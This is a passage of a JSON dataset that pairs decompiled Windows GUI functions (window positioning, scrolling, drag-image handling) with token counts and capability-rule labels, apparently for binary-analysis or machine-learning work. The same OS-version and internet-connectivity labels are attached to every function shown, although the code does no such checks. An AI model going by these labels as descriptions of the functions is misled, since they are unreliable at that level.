            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00457a5c(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x57) == '\\0') && (*(in_EAX + 0x30) != 0)) {\n        fcn.00454464();\n    }\n    if (((*(in_EAX + 0x1c) & 0x10) == 0) || ((*(in_EAX + 0x51) & 4) != 0)) {\n        fcn.004551b8();\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "00457be0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00457be0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (((*(in_EAX + 0x50) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n        cVar1 = fcn.00458904();\n        if (cVar1 != '\\0') {\n            iVar2 = sub.user32.dll_IsWindowVisible(*(in_EAX + 0x1b4));\n            if (iVar2 != 0) {\n                fcn.004584fc();\n            }\n        }\n    }\n    fcn.00454778();\n    return;\n}\n",
        "token_count": 155
    },
    "00457d24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t fcn.00457d24(void)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uStack20;\n    \n    uVar1 = uStack20;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n        if (in_EAX != 0) {\n            do {\n                iVar3 = fcn.0040484c();\n                if ((iVar3 != 0) && (*(iVar3 + 0x38) != 0)) {\n                    cVar2 = fcn.0040484c();\n                    if (cVar2 != '\\0') goto code_r0x00457daf;\n                }\n                in_EAX = *(in_EAX + 0x30);\n            } while (in_EAX != 0);\n        }\n        iVar3 = fcn.0043bd90();\n        if (iVar3 != 0) {\n            cVar2 = fcn.0040484c();\n            if (cVar2 != '\\0') goto code_r0x00457daf;\n        }\n    }\n    iVar3 = fcn.0044d380();\n    if (iVar3 == 0) {\n        uStack20 = uVar1 & 0xffffff00;\n    }\ncode_r0x00457daf:\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 349
    },
    "004581a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004581a4(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack32;\n    \n    iVar4 = *(in_EAX + 0x1b4);\n    if ((iVar4 == 0) || (iVar3 = sub.user32.dll_IsWindowVisible(),  iStack32 = iVar4,  iVar3 == 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        sub.user32.dll_ScrollWindow(*(in_EAX + 0x1b4), iStack32, param_2, 0, 0);\n    }\n    iVar4 = fcn.004546e8();\n    if (-1 < iVar4 + -1) {\n        do {\n            iVar3 = fcn.004546ac();\n            cVar2 = fcn.004047dc();\n            if ((cVar2 == '\\0') || (*(iVar3 + 0x1b4) == 0)) {\n                *(iVar3 + 0x40) = *(iVar3 + 0x40) + iStack32;\n                *(iVar3 + 0x44) = *(iVar3 + 0x44) + param_2;\n            }\n            else if (!bVar1) {\n                iStack32 = *(iVar3 + 0x1b4);\n                sub.user32.dll_SetWindowPos();\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    fcn.0045422c();\n    return;\n}\n",
        "token_count": 386
    },
    "00458294": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00458294(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar2 = *(*(in_EAX + 0x30) + 0x1cc);\n        if (iVar2 != 0) {\n            param_2 = param_2 - *(iVar2 + 8);\n        }\n        iVar2 = fcn.004198f4();\n        if (-1 < iVar2) {\n            iVar1 = *(*(*(in_EAX + 0x30) + 0x1d0) + 8);\n            if (param_2 < 0) {\n                param_2 = 0;\n            }\n            if (iVar1 <= param_2) {\n                param_2 = iVar1 + -1;\n            }\n            if (iVar2 != param_2) {\n                fcn.0041978c();\n                fcn.00419914();\n            }\n        }\n        if (*(in_EAX + 0x1b4) != 0) {\n            if (param_2 == 0) {\n                uVar3 = 1;\n            }\n            else if (param_2 == *(*(*(in_EAX + 0x30) + 0x1d0) + 8) + -1) {\n                uVar3 = 0;\n            }\n            else if (iVar2 < param_2) {\n                fcn.00419898();\n                uVar3 = fcn.004585f8();\n            }\n            else {\n                if (iVar2 <= param_2) {\n                    return;\n                }\n                fcn.00419898();\n                uVar3 = fcn.004585f8();\n            }\n            sub.user32.dll_SetWindowPos(*(in_EAX + 0x1b4), uVar3, 0, 0, 0, 0, 3);\n        }\n    }\n    return;\n}\n",
        "token_count": 454
    },
    "004585d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004585d4(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX[0x6d] == 0) {\n        if (in_EAX[0xc] != 0) {\n            fcn.004585d4();\n        }\n        (**(*in_EAX + 0x98))();\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "00458904": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00458904(void)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffffff00 | *(in_EAX + 0x1b4) != 0;\n}\n",
        "token_count": 50
    },
    "00458a28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00458a28(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    char in_CL;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_5h;\n    \n    var_ch = 0;\n    puStack40 = 0x458a4a;\n    iVar2 = fcn.00404620();\n    uStack44 = 0x458b1e;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.0040484c();\n    if (0 < *(iVar2 + 8)) {\n        var_10h = fcn.004198f4();\n        iVar4 = var_10h;\n        if (var_10h == -1) {\n            if (in_CL == '\\0') {\n                var_10h = 0;\n                iVar4 = var_10h;\n            }\n            else {\n                var_10h = *(iVar2 + 8) + -1;\n                iVar4 = var_10h;\n            }\n        }\n        do {\n            if (in_CL == '\\0') {\n                if (iVar4 == 0) {\n                    iVar4 = *(iVar2 + 8);\n                }\n                iVar4 = iVar4 + -1;\n            }\n            else {\n                iVar4 = iVar4 + 1;\n                if (iVar4 == *(iVar2 + 8)) {\n                    iVar4 = 0;\n                }\n            }\n            iVar3 = fcn.00419898();\n            cVar1 = fcn.0040484c();\n            if (((cVar1 != '\\0') && ((arg_ch == '\\0' || (*(iVar3 + 0x1d8) != '\\0')))) &&\n               ((arg_8h == '\\0' || (*(iVar3 + 0x30) == in_EAX)))) {\n                var_ch = iVar3;\n            }\n        } while ((var_ch == 0) && (iVar4 != var_10h));\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x458b25;\n    uStack44 = 0x458b1d;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 567
    },
    "00458bf0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00458bf0(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *in_ECX;\n    int32_t *in_EDX;\n    \n    iVar1 = in_EAX[0x1d];\n    if (*(iVar1 + 0x14) == 0) {\n        *in_EDX = 0;\n    }\n    else {\n        *in_EDX = *(in_EAX[0x1d] + 0x14);\n    }\n    if (*(iVar1 + 0x10) == 0) {\n        *in_ECX = 0;\n    }\n    else {\n        *in_ECX = *(in_EAX[0x1d] + 0x10);\n    }\n    if (*(iVar1 + 0xc) == 0) {\n        *arg_ch = 0;\n    }\n    else {\n        *arg_ch = *(in_EAX[0x1d] + 0xc);\n    }\n    if (*(iVar1 + 8) == 0) {\n        *arg_8h = 0;\n    }\n    else {\n        *arg_8h = *(in_EAX[0x1d] + 8);\n    }\n    if ((*(in_EAX + 0x52) & 0x10) != 0) {\n        iVar1 = *(in_EAX[0x1e] + 8) + *(in_EAX[0x1e] + 0x10);\n        if (0 < *in_EDX) {\n            *in_EDX = *in_EDX + iVar1;\n        }\n        if (iVar1 <= *arg_ch) {\n            *arg_ch = *arg_ch - iVar1;\n        }\n        iVar1 = *(in_EAX[0x1e] + 0xc) + *(in_EAX[0x1e] + 0x14);\n        if (0 < *in_ECX) {\n            *in_ECX = *in_ECX + iVar1;\n        }\n        if (iVar1 <= *arg_8h) {\n            *arg_8h = *arg_8h - iVar1;\n        }\n    }\n    (**(*in_EAX + 0x38))(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 517
    },
    "00458cb4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00458cb4(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_EDX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t lprc;\n    int32_t var_5ah;\n    int32_t var_56h;\n    int32_t var_52h;\n    char var_4eh;\n    char var_4dh;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    var_4h = in_EDX;\n    cVar1 = fcn.00458904();\n    if ((cVar1 != '\\0') && (iVar3 = fcn.004546e8(),  iVar3 != 0)) {\n        (**(*in_EAX + 0x44))();\n        (**(*in_EAX + 0x90))();\n        iVar3 = sub.user32.dll_IsRectEmpty();\n        if (iVar3 == 0) {\n            var_ch = (**(*in_EAX[0x1e] + 0x10))();\n            var_ch = var_ch - (var_56h - lprc);\n            var_10h = (**(*in_EAX[0x1e] + 0x10))();\n            var_10h = var_10h - (var_52h - var_5ah);\n            var_14h = (**(*in_EAX[0x1e] + 0x10))();\n            var_14h = var_14h - (var_56h - lprc);\n            var_18h = (**(*in_EAX[0x1e] + 0x10))();\n            var_18h = var_18h - (var_52h - var_5ah);\n            if (0 < *var_4h) {\n                *var_4h = *var_4h - var_ch;\n            }\n            if (0 < *var_8h) {\n                *var_8h = *var_8h - var_10h;\n            }\n            if (0 < *arg_ch) {\n                *arg_ch = *arg_ch - var_14h;\n            }\n            if (0 < *arg_8h) {\n                *arg_8h = *arg_8h - var_18h;\n            }\n            arg_8h_00 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff80;\n            var_20h = 0;\n            var_30h = 0;\n            var_24h = 0;\n            var_34h = 0;\n            var_28h = 0;\n            var_38h = 0;\n            var_2ch = 0;\n            var_3ch = 0;\n            iVar3 = fcn.004546e8();\n            if (-1 < iVar3 + -1) {\n                var_1ch = 0;\n                do {\n                    iVar4 = fcn.004546ac();\n                    if ((*(iVar4 + 0x57) != '\\0') || (((*(iVar4 + 0x1c) & 0x10) != 0 && ((*(iVar4 + 0x51) & 4) == 0))))\n                    {\n                        arg_8h_00 = &var_4ch;\n                        fcn.00458bf0(arg_8h_00, &var_44h);\n                        cVar1 = *(iVar4 + 0x5b);\n                        if (cVar1 == '\\0') {\n                            if (*0x459138 == (*(iVar4 + 0x61) & *0x459138)) {\n                                var_4dh = '\\x01';\n                                if (0 < var_40h) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_40h = ((var_56h - lprc) - iVar5) - var_40h;\n                                }\n                                if (0 < var_44h) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_44h = ((var_56h - lprc) + var_44h) - iVar5;\n                                }\n                            }\n                            else {\n                                var_4dh = '\\0';\n                            }\n                        }\n                        else if (cVar1 - 1U < 2) {\n                            var_4dh = '\\x01';\n                        }\n                        else if (cVar1 == '\\x05') {\n                            var_4dh = '\\x02';\n                        }\n                        else {\n                            var_4dh = '\\x03';\n                        }\n                        if (*(iVar4 + 0x5b) == '\\0') {\n                            if (*0x45913c == (*(iVar4 + 0x61) & *0x45913c)) {\n                                var_4eh = '\\x01';\n                                if (0 < var_48h) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_48h = ((var_52h - var_5ah) - iVar5) - var_48h;\n                                }\n                                if (0 < var_4ch) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_4ch = ((var_52h - var_5ah) + var_4ch) - iVar5;\n                                }\n                            }\n                            else {\n                                var_4eh = '\\0';\n                            }\n                        }\n                        else {\n                            uVar2 = *(iVar4 + 0x5b) - 3;\n                            if (uVar2 < 2) {\n                                var_4eh = '\\x01';\n                            }\n                            else if (uVar2 == 2) {\n                                var_4eh = '\\x02';\n                            }\n                            else {\n                                var_4eh = '\\x03';\n                            }\n                        }\n                        if (var_4dh - 1U < 2) {\n                            if (((0 < var_40h) && (*var_4h < var_40h)) && (*var_4h = var_40h,  var_20h < *var_4h)) {\n                                var_20h = *var_4h;\n                            }\n                            if (((0 < var_44h) && (var_44h < *arg_ch)) && (*arg_ch = var_44h,  var_24h < *arg_ch)) {\n                                var_24h = *arg_ch;\n                            }\n                        }\n                        else if (var_4dh == '\\x03') {\n                            iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_30h = var_30h + iVar5;\n                            iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_34h = var_34h + iVar5;\n                        }\n                        if (var_4eh - 1U < 2) {\n                            if (((0 < var_48h) && (*var_8h < var_48h)) && (*var_8h = var_48h,  var_28h < *var_8h)) {\n                                var_28h = *var_8h;\n                            }\n                            if (((0 < var_4ch) && (var_4ch < *arg_8h)) && (*arg_8h = var_4ch,  var_2ch < *arg_8h)) {\n                                var_2ch = *arg_8h;\n                            }\n                        }\n                        else if (var_4eh - 1U == 2) {\n                            iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_38h = var_38h + iVar5;\n                            iVar4 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_3ch = var_3ch + iVar4;\n                        }\n                    }\n                    var_1ch = var_1ch + 1;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n            if ((0 < var_20h) && (*var_4h < var_20h + var_30h)) {\n                *var_4h = var_20h + var_30h;\n            }\n            if ((0 < var_24h) && ((*arg_ch == 0 || (*arg_ch < var_24h + var_34h)))) {\n                *arg_ch = var_24h + var_34h;\n            }\n            if ((0 < var_28h) && (*var_8h < var_28h + var_38h)) {\n                *var_8h = var_28h + var_38h;\n            }\n            if ((0 < var_2ch) && ((*arg_8h == 0 || (*arg_8h < var_2ch + var_3ch)))) {\n                *arg_8h = var_2ch + var_3ch;\n            }\n            *in_FS_OFFSET = arg_8h_00;\n            if (0 < *var_4h) {\n                *var_4h = *var_4h + var_ch;\n            }\n            if (0 < *var_8h) {\n                *var_8h = *var_8h + var_10h;\n            }\n            if (0 < *arg_ch) {\n                *arg_ch = *arg_ch + var_14h;\n            }\n            if (0 < *arg_8h) {\n                *arg_8h = *arg_8h + var_18h;\n            }\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 2341
    },
    "004591f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004591f4(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_34h;\n    uint var_30h;\n    uint var_24h;\n    uint var_20h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack72 = 0x459212;\n    cVar1 = fcn.00458904();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x5b) != '\\x05')) {\n        if ((*(in_EAX + 7) & 0x10) != 0) {\n            puStack72 = 0x459238;\n            iVar2 = fcn.004546e8();\n            if (iVar2 < 1) {\n                return 1;\n            }\n        }\n        puStack72 = 0x45924e;\n        (**(*in_EAX + 0xc0))();\n        puStack72 = 0x459259;\n        (**(*in_EAX + 0x44))();\n        puStack72 = 0x459267;\n        (**(*in_EAX + 0x90))();\n        puStack72 = 0x45926f;\n        fcn.00454204();\n        uStack76 = 0x459322;\n        uStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        puStack72 = &stack0xfffffffc;\n        iVar2 = fcn.004546e8();\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar3 = fcn.004546ac();\n                if ((*(piVar3 + 0x57) != '\\0') || (((*(piVar3 + 7) & 0x10) != 0 && ((*(piVar3 + 0x51) & 4) == 0)))) {\n                    (**(*piVar3 + 0x88))(piVar3[0x13], piVar3[0x12]);\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        *in_FS_OFFSET = uStack80;\n        puStack72 = 0x459329;\n        *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xffef;\n        uStack76 = 0x459321;\n        uVar4 = fcn.0045420c();\n        return uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 618
    },
    "004598ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004598ec(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x30);\n    while ((iVar2 = iVar1,  *(in_EAX + 0x94) == 0 && (iVar2 != 0))) {\n        in_EAX = iVar2;\n        iVar1 = *(iVar2 + 0x30);\n    }\n    if (in_EAX != 0) {\n        fcn.00450430(param_2 & 0x7f);\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "00459a60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00459a60(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x459a74;\n    cVar2 = fcn.00458904();\n    if ((cVar2 == '\\0') || ((*(in_EAX + 0x55) & 0x20) != 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        puStack20 = 0x459a9a;\n        fcn.00459998();\n    }\n    uStack24 = 0x459ad0;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.00450768();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x459ad7;\n    if (bVar1) {\n        uStack24 = 0x459acf;\n        fcn.00459998();\n    }\n    return;\n}\n",
        "token_count": 284
    },
    "00459d30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00459d30(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x459dbb;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    fcn.004598d4();\n    if (*(in_EAX + 600) == '\\0') {\n        fcn.00450894();\n        fcn.00425570();\n        fcn.0044ff8c();\n        fcn.00450894();\n        fcn.0042558c();\n        fcn.0044ffc0();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x459dc2;\n    uStack24 = 0x459dba;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 230
    },
    "0045a15c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045a15c(uint param_1, int16_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((param_2 != *(in_EAX + 0x68)) && (*(in_EAX + 0x68) = param_2,  *(in_EAX + 0x6a) != '\\0')) {\n        fcn.004442a8();\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "0045a180": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045a180(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint var_4h;\n    \n    uVar2 = 0;\n    cVar1 = fcn.00448634();\n    if (cVar1 != '\\0') {\n        if (*(in_EAX + 0x6a) == '\\0') {\n            fcn.0045a114(*(in_EAX + 0x74));\n        }\n        uVar2 = fcn.0045a1f4(arg_8h);\n        if (uVar2 != '\\0') {\n            *(in_EAX + 0x7c) = *(**0x494cfc + 0x44);\n            fcn.004442a8();\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 191
    },
    "0045a258": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045a258(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    cVar1 = fcn.00448634();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x6c) != 0)) {\n        sub.comctl32.dll_ImageList_DragLeave(*(in_EAX + 0x6c));\n        *(in_EAX + 0x6c) = 0;\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "0045a2f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0045a2f0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    bool bVar3;\n    \n    cVar1 = fcn.00448634();\n    if ((cVar1 == '\\0') || (*(in_EAX + 0x6a) == '\\0')) {\n        bVar3 = false;\n    }\n    else {\n        fcn.0045a258();\n        iVar2 = sub.comctl32.dll_ImageList_EndDrag();\n        bVar3 = iVar2 != 0;\n        *(in_EAX + 0x6a) = 0;\n        fcn.0045a15c();\n        fcn.004442a8();\n    }\n    return bVar3;\n}\n",
        "token_count": 171
    },
    "0045a340": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0045a340(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00453534();\n    uVar1 = fcn.00425108();\n    *(in_EAX + 0x250) = uVar1;\n    fcn.0044f140();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 198
    },
    "0045a4b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045a4b8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x14) == 0) || (*(*(in_EAX + 0x14) + 0x10) == '\\0')) &&\n       ((in_EAX != *(*(in_EAX + 0x1c) + 100) || (*(in_EAX + 0x10) == '\\0')))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 115
    },
    "0045a600": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045a600(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint uStack32;\n    uint uStack28;\n    \n    iVar1 = in_EAX;\n    while (iVar3 = iVar1,  iVar3 != *(*(in_EAX + 0x1c) + 100)) {\n        iVar1 = *(iVar3 + 0x14);\n        if ((param_2 == *(iVar1 + 0x10)) && (*(iVar3 + 0x18) != 0)) {\n            uVar2 = fcn.0045aa58();\n            return uVar2;\n        }\n    }\n    (**(**(*(in_EAX + 0x1c) + 0x14) + 0x44))();\n    (**(**(*(in_EAX + 0x1c) + 0x14) + 0x90))();\n    if (param_2 == '\\x01') {\n        return uStack28;\n    }\n    if (param_2 == '\\x02') {\n        return uStack32;\n    }\n    return 0;\n}\n",
        "token_count": 268
    },
    "0045a684": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
